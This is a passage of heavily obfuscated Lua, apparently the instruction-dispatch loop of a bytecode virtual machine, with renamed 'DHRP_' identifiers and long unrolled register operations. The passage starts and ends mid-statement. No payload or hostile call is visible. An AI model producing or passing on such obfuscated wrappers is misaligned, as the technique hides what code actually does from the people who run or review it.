c[DHRP_f+1]=DHRP_h;DHRP_c[DHRP_f]=DHRP_h[DHRP_a[4]];elseif DHRP_f==36 then DHRP_c[DHRP_a[2]]=DHRP_c[DHRP_a[3]][DHRP_a[4]];else local DHRP_a=DHRP_a[2]DHRP_c[DHRP_a](DHRP_c[DHRP_a+1])end;elseif DHRP_f<=38 then local DHRP_b=DHRP_a[2]local DHRP_d,DHRP_a=DHRP_n(DHRP_c[DHRP_b](DHRP_g(DHRP_c,DHRP_b+1,DHRP_a[3])))DHRP_h=DHRP_a+DHRP_b-1 local DHRP_a=0;for DHRP_b=DHRP_b,DHRP_h do DHRP_a=DHRP_a+1;DHRP_c[DHRP_b]=DHRP_d[DHRP_a];end;elseif DHRP_f==39 then local DHRP_f;DHRP_c[DHRP_a[2]]=DHRP_e[DHRP_a[3]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_c[DHRP_a[3]][DHRP_a[4]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_a[3];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_f=DHRP_a[2]DHRP_c[DHRP_f]=DHRP_c[DHRP_f](DHRP_c[DHRP_f+1])DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_e[DHRP_a[3]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_c[DHRP_a[3]][DHRP_a[4]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_a[3];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_f=DHRP_a[2]DHRP_c[DHRP_f]=DHRP_c[DHRP_f](DHRP_c[DHRP_f+1])DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_e[DHRP_a[3]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_c[DHRP_a[3]][DHRP_a[4]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_a[3];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_f=DHRP_a[2]DHRP_c[DHRP_f]=DHRP_c[DHRP_f](DHRP_c[DHRP_f+1])DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_e[DHRP_a[3]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_c[DHRP_a[3]][DHRP_a[4]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_a[3];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_f=DHRP_a[2]DHRP_c[DHRP_f]=DHRP_c[DHRP_f](DHRP_c[DHRP_f+1])DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_e[DHRP_a[3]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_c[DHRP_a[3]][DHRP_a[4]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_a[3];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_f=DHRP_a[2]DHRP_c[DHRP_f]=DHRP_c[DHRP_f](DHRP_c[DHRP_f+1])DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_e[DHRP_a[3]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_c[DHRP_a[3]][DHRP_a[4]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_a[3];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_f=DHRP_a[2]DHRP_c[DHRP_f]=DHRP_c[DHRP_f](DHRP_c[DHRP_f+1])DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_e[DHRP_a[3]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_c[DHRP_a[3]][DHRP_a[4]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_a[3];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_f=DHRP_a[2]DHRP_c[DHRP_f]=DHRP_c[DHRP_f](DHRP_c[DHRP_f+1])DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_e[DHRP_a[3]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_c[DHRP_a[3]][DHRP_a[4]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_a[3];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_f=DHRP_a[2]DHRP_c[DHRP_f]=DHRP_c[DHRP_f](DHRP_c[DHRP_f+1])DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_e[DHRP_a[3]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_c[DHRP_a[3]][DHRP_a[4]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_a[3];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_f=DHRP_a[2]DHRP_c[DHRP_f]=DHRP_c[DHRP_f](DHRP_c[DHRP_f+1])DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_e[DHRP_a[3]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_c[DHRP_a[3]][DHRP_a[4]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_a[3];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_f=DHRP_a[2]DHRP_c[DHRP_f]=DHRP_c[DHRP_f](DHRP_c[DHRP_f+1])DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_e[DHRP_a[3]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_c[DHRP_a[3]][DHRP_a[4]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_a[3];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_f=DHRP_a[2]DHRP_c[DHRP_f]=DHRP_c[DHRP_f](DHRP_c[DHRP_f+1])DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_e[DHRP_a[3]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_c[DHRP_a[3]][DHRP_a[4]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_a[3];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_f=DHRP_a[2]DHRP_c[DHRP_f]=DHRP_c[DHRP_f](DHRP_c[DHRP_f+1])DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_e[DHRP_a[3]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_c[DHRP_a[3]][DHRP_a[4]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_a[3];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_f=DHRP_a[2]DHRP_c[DHRP_f]=DHRP_c[DHRP_f](DHRP_c[DHRP_f+1])DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_e[DHRP_a[3]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_c[DHRP_a[3]][DHRP_a[4]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_a[3];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_f=DHRP_a[2]DHRP_c[DHRP_f]=DHRP_c[DHRP_f](DHRP_c[DHRP_f+1])DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_e[DHRP_a[3]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_c[DHRP_a[3]][DHRP_a[4]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_a[3];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_f=DHRP_a[2]DHRP_c[DHRP_f]=DHRP_c[DHRP_f](DHRP_c[DHRP_f+1])DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]][DHRP_a[3]]=DHRP_a[4];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_e[DHRP_a[3]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_c[DHRP_a[3]][DHRP_a[4]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]][DHRP_a[3]]=DHRP_c[DHRP_a[4]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]][DHRP_a[3]]=DHRP_a[4];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]][DHRP_a[3]]=DHRP_c[DHRP_a[4]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_e[DHRP_a[3]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_c[DHRP_a[3]][DHRP_a[4]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_a[3];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_a[3];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_a[3];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_f=DHRP_a[2]DHRP_c[DHRP_f]=DHRP_c[DHRP_f](DHRP_g(DHRP_c,DHRP_f+1,DHRP_a[3]))DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]][DHRP_a[3]]=DHRP_c[DHRP_a[4]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]][DHRP_a[3]]=DHRP_a[4];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]][DHRP_a[3]]=DHRP_a[4];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_e[DHRP_a[3]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_c[DHRP_a[3]][DHRP_a[4]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_a[3];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_a[3];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_a[3];else DHRP_e[DHRP_a[3]]=DHRP_c[DHRP_a[2]];end;elseif DHRP_f<=43 then if DHRP_f<=41 then DHRP_c[DHRP_a[2]]();elseif DHRP_f>42 then do return end;else for DHRP_a=DHRP_a[2],DHRP_a[3]do DHRP_c[DHRP_a]=nil;end;end;elseif DHRP_f<=44 then if not DHRP_c[DHRP_a[2]]then DHRP_b=DHRP_b+1;else DHRP_b=DHRP_a[3];end;elseif DHRP_f>45 then local DHRP_i;local DHRP_l,DHRP_k;local DHRP_j;local DHRP_f;DHRP_c[DHRP_a[2]][DHRP_a[3]]=DHRP_a[4];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_e[DHRP_a[3]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_e[DHRP_a[3]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_f=DHRP_a[2];DHRP_j=DHRP_c[DHRP_a[3]];DHRP_c[DHRP_f+1]=DHRP_j;DHRP_c[DHRP_f]=DHRP_j[DHRP_a[4]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_a[3];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=(DHRP_a[3]~=0);DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_f=DHRP_a[2]DHRP_l,DHRP_k=DHRP_n(DHRP_c[DHRP_f](DHRP_g(DHRP_c,DHRP_f+1,DHRP_a[3])))DHRP_h=DHRP_k+DHRP_f-1 DHRP_i=0;for DHRP_a=DHRP_f,DHRP_h do DHRP_i=DHRP_i+1;DHRP_c[DHRP_a]=DHRP_l[DHRP_i];end;DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_f=DHRP_a[2]DHRP_c[DHRP_f]=DHRP_c[DHRP_f](DHRP_g(DHRP_c,DHRP_f+1,DHRP_h))DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]();DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_b=DHRP_a[3];else DHRP_c[DHRP_a[2]]={};end;elseif DHRP_f<=69 then if DHRP_f<=57 then if DHRP_f<=51 then if DHRP_f<=48 then if DHRP_f>47 then local DHRP_b=DHRP_a[2]DHRP_c[DHRP_b](DHRP_g(DHRP_c,DHRP_b+1,DHRP_a[3]))else local DHRP_d=DHRP_a[2];local DHRP_f=DHRP_a[4];local DHRP_e=DHRP_d+2 local DHRP_d={DHRP_c[DHRP_d](DHRP_c[DHRP_d+1],DHRP_c[DHRP_e])};for DHRP_a=1,DHRP_f do DHRP_c[DHRP_e+DHRP_a]=DHRP_d[DHRP_a];end;local DHRP_d=DHRP_d[1]if DHRP_d then DHRP_c[DHRP_e]=DHRP_d DHRP_b=DHRP_a[3];else DHRP_b=DHRP_b+1;end;end;elseif DHRP_f<=49 then DHRP_c[DHRP_a[2]]=(DHRP_a[3]~=0);DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=(DHRP_a[3]~=0);DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_e[DHRP_a[3]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_c[DHRP_a[3]][DHRP_a[4]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_e[DHRP_a[3]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_c[DHRP_a[3]][DHRP_a[4]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_c[DHRP_a[3]][DHRP_a[4]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];if(DHRP_c[DHRP_a[2]]==DHRP_c[DHRP_a[4]])then DHRP_b=DHRP_b+1;else DHRP_b=DHRP_a[3];end;elseif DHRP_f==50 then local DHRP_h;local DHRP_f;DHRP_f=DHRP_a[2];DHRP_h=DHRP_c[DHRP_a[3]];DHRP_c[DHRP_f+1]=DHRP_h;DHRP_c[DHRP_f]=DHRP_h[DHRP_a[4]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_a[3];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_f=DHRP_a[2]DHRP_c[DHRP_f]=DHRP_c[DHRP_f](DHRP_g(DHRP_c,DHRP_f+1,DHRP_a[3]))DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_f=DHRP_a[2];DHRP_h=DHRP_c[DHRP_a[3]];DHRP_c[DHRP_f+1]=DHRP_h;DHRP_c[DHRP_f]=DHRP_h[DHRP_a[4]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_e[DHRP_a[3]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_c[DHRP_a[3]][DHRP_a[4]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_e[DHRP_a[3]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_c[DHRP_a[3]][DHRP_a[4]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_c[DHRP_a[3]][DHRP_a[4]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_f=DHRP_a[2]DHRP_c[DHRP_f]=DHRP_c[DHRP_f](DHRP_g(DHRP_c,DHRP_f+1,DHRP_a[3]))else DHRP_c[DHRP_a[2]]=DHRP_a[3];end;elseif DHRP_f<=54 then if DHRP_f<=52 then local DHRP_a=DHRP_a[2]DHRP_c[DHRP_a]=DHRP_c[DHRP_a](DHRP_c[DHRP_a+1])elseif DHRP_f>53 then local DHRP_h=DHRP_l[DHRP_a[3]];local DHRP_g;local DHRP_f={};DHRP_g=DHRP_p({},{__index=function(DHRP_b,DHRP_a)local DHRP_a=DHRP_f[DHRP_a];return DHRP_a[1][DHRP_a[2]];end,__newindex=function(DHRP_c,DHRP_a,DHRP_b)local DHRP_a=DHRP_f[DHRP_a]DHRP_a[1][DHRP_a[2]]=DHRP_b;end;});for DHRP_e=1,DHRP_a[4]do DHRP_b=DHRP_b+1;local DHRP_a=DHRP_d[DHRP_b];if DHRP_a[1]==60 then DHRP_f[DHRP_e-1]={DHRP_c,DHRP_a[3]};else DHRP_f[DHRP_e-1]={DHRP_k,DHRP_a[3]};end;DHRP_j[#DHRP_j+1]=DHRP_f;end;DHRP_c[DHRP_a[2]]=DHRP_i(DHRP_h,DHRP_g,DHRP_e);else DHRP_c[DHRP_a[2]][DHRP_a[3]]=DHRP_a[4];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_e[DHRP_a[3]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_c[DHRP_a[3]][DHRP_a[4]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]][DHRP_a[3]]=DHRP_c[DHRP_a[4]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]][DHRP_a[3]]=DHRP_a[4];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]={};DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]][DHRP_a[3]]=DHRP_a[4];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]][DHRP_a[3]]=DHRP_c[DHRP_a[4]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]][DHRP_a[3]]=DHRP_a[4];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]={};end;elseif DHRP_f<=55 then local DHRP_f;DHRP_c[DHRP_a[2]][DHRP_a[3]]=DHRP_a[4];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_e[DHRP_a[3]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_a[3];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_f=DHRP_a[2]DHRP_c[DHRP_f]=DHRP_c[DHRP_f](DHRP_c[DHRP_f+1])DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]][DHRP_a[3]]=DHRP_c[DHRP_a[4]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]={};DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]={};DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]][DHRP_a[3]]=DHRP_a[4];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_e[DHRP_a[3]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_c[DHRP_a[3]][DHRP_a[4]];elseif DHRP_f>56 then DHRP_c[DHRP_a[2]]=DHRP_i(DHRP_l[DHRP_a[3]],nil,DHRP_e);else local DHRP_a=DHRP_a[2]DHRP_c[DHRP_a]=DHRP_c[DHRP_a](DHRP_g(DHRP_c,DHRP_a+1,DHRP_h))end;elseif DHRP_f<=63 then if DHRP_f<=60 then if DHRP_f<=58 then DHRP_c[DHRP_a[2]]=DHRP_e[DHRP_a[3]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_c[DHRP_a[3]][DHRP_a[4]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_c[DHRP_a[3]][DHRP_a[4]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]][DHRP_a[3]]=DHRP_c[DHRP_a[4]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]][DHRP_a[3]]=DHRP_a[4];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_e[DHRP_a[3]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_c[DHRP_a[3]][DHRP_a[4]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_a[3];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_a[3];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_a[3];elseif DHRP_f>59 then DHRP_c[DHRP_a[2]]=DHRP_c[DHRP_a[3]];else local DHRP_b=DHRP_a[2]DHRP_c[DHRP_b]=DHRP_c[DHRP_b](DHRP_g(DHRP_c,DHRP_b+1,DHRP_a[3]))end;elseif DHRP_f<=61 then DHRP_c[DHRP_a[2]]=DHRP_a[3];elseif DHRP_f>62 then for DHRP_a=DHRP_a[2],DHRP_a[3]do DHRP_c[DHRP_a]=nil;end;else DHRP_c[DHRP_a[2]][DHRP_a[3]]=DHRP_a[4];end;elseif DHRP_f<=66 then if DHRP_f<=64 then if(DHRP_c[DHRP_a[2]]==DHRP_a[4])then DHRP_b=DHRP_b+1;else DHRP_b=DHRP_a[3];end;elseif DHRP_f>65 then local DHRP_f;DHRP_c[DHRP_a[2]]=DHRP_e[DHRP_a[3]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_c[DHRP_a[3]][DHRP_a[4]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_a[3];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_a[3];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_a[3];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_f=DHRP_a[2]DHRP_c[DHRP_f]=DHRP_c[DHRP_f](DHRP_g(DHRP_c,DHRP_f+1,DHRP_a[3]))DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]][DHRP_a[3]]=DHRP_c[DHRP_a[4]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]][DHRP_a[3]]=DHRP_a[4];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]][DHRP_a[3]]=DHRP_a[4];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]][DHRP_a[3]]=DHRP_c[DHRP_a[4]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_e[DHRP_a[3]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_c[DHRP_a[3]][DHRP_a[4]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_a[3];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_a[3];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_a[3];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_f=DHRP_a[2]DHRP_c[DHRP_f]=DHRP_c[DHRP_f](DHRP_g(DHRP_c,DHRP_f+1,DHRP_a[3]))DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]][DHRP_a[3]]=DHRP_c[DHRP_a[4]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]][DHRP_a[3]]=DHRP_a[4];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]][DHRP_a[3]]=DHRP_a[4];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_e[DHRP_a[3]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_c[DHRP_a[3]][DHRP_a[4]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_a[3];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_a[3];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_a[3];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_a[3];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_f=DHRP_a[2]DHRP_c[DHRP_f]=DHRP_c[DHRP_f](DHRP_g(DHRP_c,DHRP_f+1,DHRP_a[3]))DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]][DHRP_a[3]]=DHRP_c[DHRP_a[4]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[